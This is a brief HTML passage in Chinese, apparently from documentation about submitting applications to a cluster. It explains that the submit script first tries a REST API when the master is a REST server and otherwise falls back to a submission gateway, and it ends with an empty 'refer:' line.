 <p>注意：如果指定的master参数是rest服务器，这个脚本会先尝试使用rest api来提交应用；如果发现不是rest服务器，则会降级到使用submission gateway来提交应用。</p>
 <p>refer:</p>
